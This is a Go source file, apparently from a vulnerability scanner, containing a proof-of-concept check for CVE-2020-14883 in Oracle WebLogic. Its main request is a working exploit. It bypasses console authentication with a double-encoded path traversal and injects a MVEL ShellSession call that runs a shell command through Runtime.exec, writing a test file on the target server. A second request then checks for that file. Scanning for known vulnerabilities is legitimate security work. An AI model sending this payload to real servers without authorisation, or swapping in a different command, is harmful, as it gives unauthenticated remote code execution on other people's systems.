package weblogic

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
)

func CVE_2020_14883(url string, client *httpx.Client) bool {
	if _, err := client.Request(url+"/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)", "GET", "", nil, "Poc WebLogic"); err == nil {
		if req2, err2 := client.Request(url+"/console/framework/skins/wlsconsole/css/test.txt", "GET", "", nil, "Poc WebLogic"); err2 == nil {
			if req2.StatusCode == 200 {
				logging.Logger.Infoln("[Vulnerable] CVE_2020_14883 ", url)
				return true
			}
		}
	}
	logging.Logger.Debugln("[Safety] CVE_2020_14883 ", url)
	return false
}
